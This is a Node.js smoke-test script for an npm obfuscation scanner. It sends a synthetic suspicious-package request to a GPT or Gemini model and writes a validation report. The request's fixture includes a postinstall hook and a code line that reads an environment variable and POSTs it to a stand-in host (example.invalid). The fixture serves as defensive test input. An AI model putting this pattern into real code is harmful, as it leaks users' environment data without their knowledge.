import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const scriptDir = dirname(fileURLToPath(import.meta.url));
const scannerRoot = resolve(scriptDir, '..');
const repositoryRoot = resolve(scannerRoot, '../..');

loadEnvironment(join(repositoryRoot, '.env'));

const provider = process.env.OBFUSCATION_LLM_PROVIDER ?? 'gpt';
if (provider !== 'gpt' && provider !== 'gemini') {
  fail(`지원하지 않는 제공자입니다: ${provider}`);
}

const assistant = createAssistant(provider);
const outcome = await assistant.analyze(buildRequest());
const reportPath = writeReport(provider, outcome);

console.log(`LLM 스모크 테스트 보고서: ${reportPath}`);
if (outcome.status !== 'COMPLETED') process.exitCode = 1;

function createAssistant(selectedProvider) {
  if (selectedProvider === 'gemini') {
    const apiKey = requiredEnvironment('GEMINI_API_KEY');
    const { GeminiCodeAssistant } = require('../dist/analyzers/obfuscation/gemini-code-assistant.js');
    return new GeminiCodeAssistant({
      apiKey,
      model: process.env.OBFUSCATION_GEMINI_MODEL ?? 'gemini-3.5-flash',
      baseUrl: process.env.OBFUSCATION_GEMINI_BASE_URL
        ?? 'https://generativelanguage.googleapis.com/v1beta/openai',
      timeoutMs: readPositiveInteger('OBFUSCATION_GPT_TIMEOUT_MS', 20_000),
      maxOutputTokens: readPositiveInteger('OBFUSCATION_GPT_MAX_OUTPUT_TOKENS', 2_048),
    });
  }

  const apiKey = requiredEnvironment('OPENAI_API_KEY');
  const { OpenAiGptCodeAssistant } = require('../dist/analyzers/obfuscation/gpt-code-assistant.js');
  return new OpenAiGptCodeAssistant({
    apiKey,
    model: process.env.OBFUSCATION_GPT_MODEL ?? 'gpt-4o-mini',
    baseUrl: process.env.OBFUSCATION_GPT_BASE_URL ?? 'https://api.openai.com/v1',
    timeoutMs: readPositiveInteger('OBFUSCATION_GPT_TIMEOUT_MS', 20_000),
    maxOutputTokens: readPositiveInteger('OBFUSCATION_GPT_MAX_OUTPUT_TOKENS', 2_048),
  });
}

function buildRequest() {
  return {
    schemaVersion: '0.1',
    requestId: '수동-스모크-요청',
    scanId: '수동-스모크-스캔',
    sampleId: 'a'.repeat(64),
    purpose: 'DEOBFUSCATION_CODE_UNDERSTANDING',
    package: {
      ecosystem: 'npm',
      name: 'obfuscation-llm-smoke-fixture',
      version: '1.0.0',
      artifactHash: 'a'.repeat(64),
      description: '외부 전송 흐름을 검증하는 합성 샘플',
      lifecycleScripts: [{ name: 'postinstall', command: 'node package/index.js' }],
    },
    candidates: [{
      path: 'package/index.js',
      reason: 'STRONG_RISK_COMBINATION',
      restored: true,
      matchedSignals: ['custom.environment-access', 'custom.network-outbound'],
      restoration: { status: 'RESTORED', appliedStages: ['STRUCTURE', 'STRING'] },
      evidences: [
        evidence('TIER_2:environment', 'custom.environment-access', '환경변수 접근', 1),
        evidence('TIER_2:network', 'custom.network-outbound', '네트워크 전송', 2),
      ],
      slices: [{
        file: 'package/index.js',
        startLine: 1,
        endLine: 2,
        code: "const collectedValue = process.env.HOME;\nfetch('https://example.invalid/collect', { method: 'POST', body: collectedValue });",
      }],
    }],
  };
}

function evidence(evidenceId, ruleId, message, line) {
  return {
    evidenceId,
    tier: 'TIER_2',
    analyzer: 'custom-rule-deobfuscated',
    ruleId,
    message,
    path: 'package/index.js',
    line,
  };
}

function writeReport(selectedProvider, outcome) {
  const reportDir = join(repositoryRoot, 'reports', 'validation');
  const reportPath = join(reportDir, `obfuscation-${selectedProvider}-live-smoke.md`);
  mkdirSync(reportDir, { recursive: true });
  const result = outcome.status === 'COMPLETED' ? '통과' : '실패';
  const content = [
    '# 난독화 LLM 실제 호출 스모크 테스트',
    '',
    `- 실행 시각: ${new Date().toISOString()}`,
    `- 제공자: ${selectedProvider}`,
    `- 모델: ${outcome.model ?? '확인 불가'}`,
    `- 결과: ${result}`,
    `- 상태: ${outcome.status}`,
    `- 응답 시간: ${outcome.durationMs}ms`,
    `- 입력 토큰: ${outcome.usage?.inputTokens ?? 0}`,
    `- 출력 토큰: ${outcome.usage?.outputTokens ?? 0}`,
    '',
    '## 검증된 응답',
    '',
    '```json',
    JSON.stringify(outcome.analysis ?? { reason: outcome.reason ?? '응답 없음' }, null, 2),
    '```',
    '',
    '> 이 보고서에는 API 키와 실제 패키지 원문을 기록하지 않는다.',
    '',
  ].join('\n');
  writeFileSync(reportPath, content, 'utf8');
  return reportPath;
}

function loadEnvironment(path) {
  if (!existsSync(path)) return;
  for (const rawLine of readFileSync(path, 'utf8').split(/\r?\n/u)) {
    const line = rawLine.trim();
    if (line === '' || line.startsWith('#')) continue;
    const separator = line.indexOf('=');
    if (separator < 1) continue;
    const key = line.slice(0, separator).trim();
    const value = line.slice(separator + 1).trim().replace(/^(['"])(.*)\1$/u, '$2');
    if (process.env[key] === undefined) process.env[key] = value;
  }
}

function requiredEnvironment(name) {
  const value = process.env[name]?.trim();
  if (value === undefined || value === '') fail(`${name}을 .env에 설정해야 합니다.`);
  return value;
}

function readPositiveInteger(name, fallback) {
  const value = Number(process.env[name] ?? fallback);
  if (!Number.isSafeInteger(value) || value <= 0) fail(`${name}은 양의 정수여야 합니다.`);
  return value;
}

function fail(message) {
  throw new Error(message);
}
